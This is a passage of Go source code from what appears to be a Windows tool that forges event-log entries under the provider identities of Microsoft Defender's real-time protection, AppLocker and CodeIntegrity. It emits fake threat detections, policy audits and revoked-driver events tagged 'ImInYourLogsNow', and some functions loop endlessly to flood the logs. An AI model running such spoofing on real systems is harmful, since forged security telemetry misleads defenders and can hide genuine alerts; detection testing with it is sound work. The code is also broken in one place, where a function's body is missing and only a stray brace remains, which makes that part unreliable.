		sha1UTF16 := syscall.StringToUTF16(data.Sha1)

		// Simplified event data - only essential fields for maximum speed
		eventData := []EventDataDescriptor{
			{Ptr: uint64(uintptr(unsafe.Pointer(&sha1UTF16[0]))), Size: uint32(len(sha1UTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&detectionGuidUTF16[0]))), Size: uint32(len(detectionGuidUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&threatTrackingIdUTF16[0]))), Size: uint32(len(threatTrackingIdUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&threatNameUTF16[0]))), Size: uint32(len(threatNameUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&classificationUTF16[0]))), Size: uint32(len(classificationUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&realPathUTF16[0]))), Size: uint32(len(realPathUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&userUTF16[0]))), Size: uint32(len(userUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&userSidUTF16[0]))), Size: uint32(len(userSidUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&wasExecutingWhileDetected))), Size: uint32(unsafe.Sizeof(wasExecutingWhileDetected))},
			{Ptr: uint64(uintptr(unsafe.Pointer(&isCritical))), Size: uint32(unsafe.Sizeof(isCritical))},
		}

		ret, _, _ = procEventWrite.Call(
			uintptr(regHandle),
			uintptr(unsafe.Pointer(&eventDescriptor)),
			uintptr(len(eventData)),
			uintptr(unsafe.Pointer(&eventData[0])),
		)

		// Update statistics for TUI display
		success := ret == 0
		UpdateProviderStats(providerName, success)

		count++
	}
}

```

`cmd/antimalwarertp.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var AntimalwareRTPProviderGuid = GUID{0x8e92deef, 0x5e17, 0x413b, [8]byte{0xb9, 0x27, 0x59, 0xb2, 0xf0, 0x6a, 0x3c, 0xfc}}

func WriteAntimalwareRTPDetectionEvent() {
	fmt.Println("Emitting Microsoft-Antimalware-RTP detection events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AntimalwareRTPProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register Microsoft-Antimalware-RTP provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	// Common data adapted from defender values
	fileNameDevice := "\\Device\\HarddiskVolume4\\Users\\JustinCredible\\Downloads\\Unconfirmed 311824.crdownload"
	fileNamePath := "C:\\Users\\JustinCredible\\Downloads\\Unconfirmed 311824.crdownload"

	// Event 27 - RTPFileScanResult
	scanReason := uint32(4)            // Scan reason
	fileId := uint64(0xE1000000008C03) // File ID
	usn := uint64(0xFFFFFFFFFFFFFFFF)  // USN
	rtpScanResult := uint32(2)         // RTP scan result
	rtpScanAction := uint32(1)         // RTP scan action
	doNotCache := uint32(0)            // Do not cache
	flags := uint32(0)                 // Flags
	scanResult := uint32(16)           // Scan result
	hrResult := uint32(0)              // HR result

	fmt.Println("Emitting Event ID 27 - RTPFileScanResult...")
	LogAntimalwareRTPFileScanResult(regHandle, fileNameDevice, scanReason, fileId, usn, rtpScanResult, rtpScanAction, doNotCache, flags, scanResult, hrResult)

	// Event 14 - RTPThreatDetection
	fmt.Println("Emitting Event ID 14 - RTPThreatDetection...")
	LogAntimalwareRTPThreatDetection(regHandle, fileNamePath)

	procEventUnregister.Call(uintptr(regHandle))
}

func LogAntimalwareRTPFileScanResult(regHandle syscall.Handle, fileName string, scanReason uint32, fileId uint64, usn uint64, rtpScanResult uint32, rtpScanAction uint32, doNotCache uint32, flags uint32, scanResult uint32, hr uint32) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 27
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 4    // Informational level
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0

	// Create event data descriptors for all 10 fields as per manifest
	eventData := []EventDataDescriptor{
		// FileName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fileName)))), Size: uint32((len(fileName) + 1) * 2)},
		// ScanReason (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanReason))), Size: 4},
		// FileId (win:UInt64)
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileId))), Size: 8},
		// USN (win:UInt64)
		{Ptr: uint64(uintptr(unsafe.Pointer(&usn))), Size: 8},
		// RtpScanResult (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&rtpScanResult))), Size: 4},
		// RtpScanAction (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&rtpScanAction))), Size: 4},
		// DoNotCache (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&doNotCache))), Size: 4},
		// Flags (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&flags))), Size: 4},
		// ScanResult (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanResult))), Size: 4},
		// hr (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&hr))), Size: 4},
	}

	log.Printf("EventID: 27")
	log.Printf("FileName: %s", fileName)
	log.Printf("ScanReason: %d", scanReason)
	log.Printf("FileId: 0x%X", fileId)
	log.Printf("RtpScanResult: %d", rtpScanResult)
	log.Printf("ScanResult: %d", scanResult)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write Microsoft-Antimalware-RTP file scan event 27: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("Microsoft-Antimalware-RTP Event 27 (File scan result) written successfully.")
	}
}

func LogAntimalwareRTPThreatDetection(regHandle syscall.Handle, file string) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 14
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 4    // Informational level
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0

	// Create event data descriptor for the single field
	eventData := []EventDataDescriptor{
		// File (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(file)))), Size: uint32((len(file) + 1) * 2)},
	}

	log.Printf("EventID: 14")
	log.Printf("File: %s", file)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write Microsoft-Antimalware-RTP threat detection event 14: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("Microsoft-Antimalware-RTP Event 14 (Threat detection) written successfully.")
	}
}

```

`cmd/applocker.go`:

```go
package cmd

import (
	"crypto/sha256"
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var AppLockerProviderGuid = GUID{0xcbda4dbf, 0x8d5d, 0x4f69, [8]byte{0x95, 0x78, 0xbe, 0x14, 0xaa, 0x54, 0x0d, 0x22}}

// WriteAppLockerProcessAuditEvent emits event 8003 (AppLocker Process Audit)
func WriteAppLockerProcessAuditEvent() {
	log.Println("Emitting AppLocker Process Audit event (8003)...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AppLockerProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register AppLocker provider: %d", status)
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}
	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	filePath := "C:\\Program Files\\ImInYourLogsNow\\suspicious.exe"
	fullFilePath := "C:\\Program Files\\ImInYourLogsNow\\suspicious.exe"
	LogAppLockerEvent(regHandle, 8003, filePath, fullFilePath)
}

// LogAppLockerEvent logs AppLocker events (8003, 8004, 8006, 8007)
func LogAppLockerEvent(regHandle syscall.Handle, eventId uint16, filePath, fullFilePath string) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 2    // Warning
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000 // Default keyword

	// Policy information
	policyName := "Default Domain Policy"
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyNameLength := uint16(len(policyNameUTF16)) // Character count

	// Rule information
	var ruleId GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&ruleId)))

	ruleName := "ImInYourLogsNow AppLocker Rule"
	ruleNameUTF16 := syscall.StringToUTF16(ruleName)
	ruleNameLength := uint16(len(ruleNameUTF16)) // Character count

	ruleSddl := "D:(A;;FX;;;S-1-1-0)"
	ruleSddlUTF16 := syscall.StringToUTF16(ruleSddl)
	ruleSddlLength := uint16(len(ruleSddlUTF16)) // Character count

	// Target user SID (Everyone: S-1-1-0) - Manual construction
	// S-1-1-0 = {0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}
	targetUserSid := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}

	targetProcessId := uint32(1234)

	// File path information
	filePathUTF16 := syscall.StringToUTF16(filePath)
	filePathLength := uint16(len(filePathUTF16)) // Character count

	// File hash
	fileHash := sha256.Sum256([]byte(filePath))
	fileHashLength := uint16(len(fileHash)) // Hash byte count

	// FQBN (Fully Qualified Binary Name)
	fqbn := "ImInYourLogsNow Binary"
	fqbnUTF16 := syscall.StringToUTF16(fqbn)
	fqbnLength := uint16(len(fqbnUTF16)) // Character count

	targetLogonId := uint64(0x12345678)

	// Full file path
	fullFilePathUTF16 := syscall.StringToUTF16(fullFilePath)
	fullFilePathLength := uint16(len(fullFilePathUTF16)) // Character count

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleId))), Size: uint32(unsafe.Sizeof(ruleId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameLength))), Size: uint32(unsafe.Sizeof(ruleNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameUTF16[0]))), Size: uint32(len(ruleNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlLength))), Size: uint32(unsafe.Sizeof(ruleSddlLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlUTF16[0]))), Size: uint32(len(ruleSddlUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetUserSid[0]))), Size: uint32(len(targetUserSid))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetProcessId))), Size: uint32(unsafe.Sizeof(targetProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&filePathLength))), Size: uint32(unsafe.Sizeof(filePathLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&filePathUTF16[0]))), Size: uint32(len(filePathUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileHashLength))), Size: uint32(unsafe.Sizeof(fileHashLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileHash[0]))), Size: uint32(fileHashLength)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnLength))), Size: uint32(unsafe.Sizeof(fqbnLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnUTF16[0]))), Size: uint32(len(fqbnUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetLogonId))), Size: uint32(unsafe.Sizeof(targetLogonId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fullFilePathLength))), Size: uint32(unsafe.Sizeof(fullFilePathLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fullFilePathUTF16[0]))), Size: uint32(len(fullFilePathUTF16) * 2)},
	}

	log.Printf("policyName: %s", policyName)
	log.Printf("ruleName: %s", ruleName)
	log.Printf("filePath: %s", filePath)
	log.Printf("targetProcessId: %d", targetProcessId)
	log.Printf("fileHashLength: %d bytes", fileHashLength)

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if statusResult != 0 {
		log.Printf("Failed to write AppLocker event %d: %s", eventId, GetWindowsErrorDescription(uint32(statusResult)))
		return
	} else {
		log.Printf("AppLocker Event %d written successfully.", eventId)
	}
}

// LogAppLockerAppxEvent logs AppLocker Appx events (8021, 8022, 8024, 8025) with task_08020Args template
func LogAppLockerAppxEvent(regHandle syscall.Handle, eventId uint16, packageName, fqbn string) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 2    // Warning
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000 // Default keyword

	// Policy information
	policyName := "Default Domain Policy"
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyNameLength := uint16(len(policyNameUTF16)) // Character count

	// Rule information
	var ruleId GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&ruleId)))

	ruleName := "ImInYourLogsNow Appx Rule"
	ruleNameUTF16 := syscall.StringToUTF16(ruleName)
	ruleNameLength := uint16(len(ruleNameUTF16)) // Character count

	ruleSddl := "D:(A;;FX;;;S-1-1-0)"
	ruleSddlUTF16 := syscall.StringToUTF16(ruleSddl)
	ruleSddlLength := uint16(len(ruleSddlUTF16)) // Character count

	// Target user SID (Everyone: S-1-1-0) - Manual construction
	targetUserSid := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}

	targetProcessId := uint32(5678)

	// Package information (replaces file path in standard AppLocker events)
	packageUTF16 := syscall.StringToUTF16(packageName)
	packageLength := uint16(len(packageUTF16)) // Character count

	// FQBN (Fully Qualified Binary Name)
	fqbnUTF16 := syscall.StringToUTF16(fqbn)
	fqbnLength := uint16(len(fqbnUTF16)) // Character count

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleId))), Size: uint32(unsafe.Sizeof(ruleId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameLength))), Size: uint32(unsafe.Sizeof(ruleNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameUTF16[0]))), Size: uint32(len(ruleNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlLength))), Size: uint32(unsafe.Sizeof(ruleSddlLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlUTF16[0]))), Size: uint32(len(ruleSddlUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetUserSid[0]))), Size: uint32(len(targetUserSid))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetProcessId))), Size: uint32(unsafe.Sizeof(targetProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageLength))), Size: uint32(unsafe.Sizeof(packageLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageUTF16[0]))), Size: uint32(len(packageUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnLength))), Size: uint32(unsafe.Sizeof(fqbnLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnUTF16[0]))), Size: uint32(len(fqbnUTF16) * 2)},
	}

	log.Printf("policyName: %s", policyName)
	log.Printf("ruleName: %s", ruleName)
	log.Printf("packageName: %s", packageName)
	log.Printf("fqbn: %s", fqbn)
	log.Printf("targetProcessId: %d", targetProcessId)

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if statusResult != 0 {
		log.Printf("Failed to write AppLocker Appx event %d: %s", eventId, GetWindowsErrorDescription(uint32(statusResult)))
		return
	} else {
		log.Printf("AppLocker Appx Event %d written successfully.", eventId)
	}
}

// WriteInfiniteRandomAppLockerEvents emits random AppLocker events continuously
func WriteInfiniteRandomAppLockerEvents() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AppLockerProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register AppLocker provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	eventIds := []uint16{8003, 8004, 8006, 8007, 8021, 8022, 8024, 8025}

	for {
		if IsEscapePressed() {
			break
		}

		activityId := GetNextGuid()
		procEventActivityId.Call(3, uintptr(unsafe.Pointer(activityId)))

		// Randomly select an event ID
		eventId := eventIds[count%len(eventIds)]

		var success bool
		switch eventId {
		case 8003, 8004:
			filePath := fmt.Sprintf("C:\\Program Files\\App_%d\\ImInYourLogsNow.exe", count)
			fullFilePath := filePath
			success = LogAppLockerEventQuiet(regHandle, eventId, filePath, fullFilePath)
		case 8006, 8007:
			filePath := fmt.Sprintf("C:\\Scripts\\ImInYourLogsNow_%d.ps1", count)
			fullFilePath := filePath
			success = LogAppLockerEventQuiet(regHandle, eventId, filePath, fullFilePath)
		case 8021, 8022:
			packageName := fmt.Sprintf("ProcessApp.Test_%d.0.0.0_x64__proc%04d", count, count)
			fqbn := fmt.Sprintf("ImInYourLogsNow Appx Process %d", count)
			success = LogAppLockerAppxEventQuiet(regHandle, eventId, packageName, fqbn)
		case 8024, 8025:
			packageName := fmt.Sprintf("ScriptApp.Test_%d.0.0.0_neutral__scr%04d", count, count)
			fqbn := fmt.Sprintf("ImInYourLogsNow Appx Script %d", count)
			success = LogAppLockerAppxEventQuiet(regHandle, eventId, packageName, fqbn)
		}

		UpdateProviderStats("AppLocker", success)
		count++
	}
}

// LogAppLockerEventQuiet is a quiet version of LogAppLockerEvent for TUI mode
func LogAppLockerEventQuiet(regHandle syscall.Handle, eventId uint16, filePath, fullFilePath string) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	// Policy information
	policyName := "Default Domain Policy"
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyNameLength := uint16(len(policyNameUTF16)) // Character count

	// Rule information
	var ruleId GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&ruleId)))

	ruleName := "ImInYourLogsNow AppLocker Rule"
	ruleNameUTF16 := syscall.StringToUTF16(ruleName)
	ruleNameLength := uint16(len(ruleNameUTF16)) // Character count

	ruleSddl := "D:(A;;FX;;;S-1-1-0)"
	ruleSddlUTF16 := syscall.StringToUTF16(ruleSddl)
	ruleSddlLength := uint16(len(ruleSddlUTF16)) // Character count

	// Target user SID (Everyone: S-1-1-0) - Manual construction
	targetUserSid := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}

	targetProcessId := uint32(1234)

	// File path information
	filePathUTF16 := syscall.StringToUTF16(filePath)
	filePathLength := uint16(len(filePathUTF16)) // Character count

	// File hash
	fileHash := sha256.Sum256([]byte(filePath))
	fileHashLength := uint16(len(fileHash)) // Hash byte count

	// FQBN (Fully Qualified Binary Name)
	fqbn := "ImInYourLogsNow Binary"
	fqbnUTF16 := syscall.StringToUTF16(fqbn)
	fqbnLength := uint16(len(fqbnUTF16)) // Character count

	targetLogonId := uint64(0x12345678)

	// Full file path
	fullFilePathUTF16 := syscall.StringToUTF16(fullFilePath)
	fullFilePathLength := uint16(len(fullFilePathUTF16)) // Character count

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleId))), Size: uint32(unsafe.Sizeof(ruleId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameLength))), Size: uint32(unsafe.Sizeof(ruleNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameUTF16[0]))), Size: uint32(len(ruleNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlLength))), Size: uint32(unsafe.Sizeof(ruleSddlLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlUTF16[0]))), Size: uint32(len(ruleSddlUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetUserSid[0]))), Size: uint32(len(targetUserSid))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetProcessId))), Size: uint32(unsafe.Sizeof(targetProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&filePathLength))), Size: uint32(unsafe.Sizeof(filePathLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&filePathUTF16[0]))), Size: uint32(len(filePathUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileHashLength))), Size: uint32(unsafe.Sizeof(fileHashLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileHash[0]))), Size: uint32(fileHashLength)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnLength))), Size: uint32(unsafe.Sizeof(fqbnLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnUTF16[0]))), Size: uint32(len(fqbnUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetLogonId))), Size: uint32(unsafe.Sizeof(targetLogonId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fullFilePathLength))), Size: uint32(unsafe.Sizeof(fullFilePathLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fullFilePathUTF16[0]))), Size: uint32(len(fullFilePathUTF16) * 2)},
	}

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return statusResult == 0
}

// LogAppLockerAppxEventQuiet is a quiet version of LogAppLockerAppxEvent for TUI mode
func LogAppLockerAppxEventQuiet(regHandle syscall.Handle, eventId uint16, packageName, fqbn string) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	// Policy information
	policyName := "Default Domain Policy"
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyNameLength := uint16(len(policyNameUTF16)) // Character count

	// Rule information
	var ruleId GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&ruleId)))

	ruleName := "ImInYourLogsNow Appx Rule"
	ruleNameUTF16 := syscall.StringToUTF16(ruleName)
	ruleNameLength := uint16(len(ruleNameUTF16)) // Character count

	ruleSddl := "D:(A;;FX;;;S-1-1-0)"
	ruleSddlUTF16 := syscall.StringToUTF16(ruleSddl)
	ruleSddlLength := uint16(len(ruleSddlUTF16)) // Character count

	// Target user SID (Everyone: S-1-1-0) - Manual construction
	targetUserSid := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}

	targetProcessId := uint32(5678)

	// Package information
	packageUTF16 := syscall.StringToUTF16(packageName)
	packageLength := uint16(len(packageUTF16)) // Character count

	// FQBN (Fully Qualified Binary Name)
	fqbnUTF16 := syscall.StringToUTF16(fqbn)
	fqbnLength := uint16(len(fqbnUTF16)) // Character count

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleId))), Size: uint32(unsafe.Sizeof(ruleId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameLength))), Size: uint32(unsafe.Sizeof(ruleNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleNameUTF16[0]))), Size: uint32(len(ruleNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlLength))), Size: uint32(unsafe.Sizeof(ruleSddlLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&ruleSddlUTF16[0]))), Size: uint32(len(ruleSddlUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetUserSid[0]))), Size: uint32(len(targetUserSid))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetProcessId))), Size: uint32(unsafe.Sizeof(targetProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageLength))), Size: uint32(unsafe.Sizeof(packageLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageUTF16[0]))), Size: uint32(len(packageUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnLength))), Size: uint32(unsafe.Sizeof(fqbnLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fqbnUTF16[0]))), Size: uint32(len(fqbnUTF16) * 2)},
	}

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return statusResult == 0
}

```

`cmd/codeintegrity.go`:

```go
package cmd

import (
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"fmt"
	"log"
	"syscall"
	"time"
	"unsafe"
)

var CodeIntegrityProviderGuid = GUID{0x4ee76bd8, 0x3cf4, 0x44a0, [8]byte{0xa0, 0xac, 0x39, 0x37, 0x64, 0x3e, 0x37, 0xa3}}

// FILETIME represents a Windows FILETIME structure
type FILETIME struct {
	DwLowDateTime  uint32
	DwHighDateTime uint32
}

// timeToFiletime converts Go time to Windows FILETIME
func timeToFiletime(t time.Time) FILETIME {
	ft := t.UnixNano()/100 + 116444736000000000 // Convert to Windows epoch
	return FILETIME{
		DwLowDateTime:  uint32(ft & 0xFFFFFFFF),
		DwHighDateTime: uint32(ft >> 32),
	}
}

// generateRandomHash generates a random hash of specified size
func generateRandomHash(size int) []byte {
	hash := make([]byte, size)
	rand.Read(hash)
	return hash
}

// WriteCodeIntegrityRevokedDriverEvent emits event 3023 (CiRevokedDriverNotLoaded)
func WriteCodeIntegrityRevokedDriverEvent() {
	log.Println("Emitting CodeIntegrity CiRevokedDriverNotLoaded event (3023)...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&CodeIntegrityProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register CodeIntegrity provider: %d", status)
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}
	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	fileName := "C:\\Windows\\System32\\ImInYourLogsNow_driver.sys"
	processName := "svchost.exe"

	LogRevokedDriverEvent(regHandle, 3023, fileName, processName, 0x12345678, 8)
}

// WriteCodeIntegrityRevokedImageEvent emits event 3036 (CiRevokedImageNotLoaded)

}

// LogRevokedDriverEvent logs events 3023 and 3036 (both use same template)
func LogRevokedDriverEvent(regHandle syscall.Handle, eventId uint16, fileName, processName string, secureRequired uint32, requestedSigningLevel uint8) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 2    // Warning
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000 // Default keyword

	// Convert to UTF-16 and get proper lengths
	fileNameUTF16 := syscall.StringToUTF16(fileName)
	processNameUTF16 := syscall.StringToUTF16(processName)

	fileNameLength := uint16(len(fileNameUTF16))
	processNameLength := uint16(len(processNameUTF16))

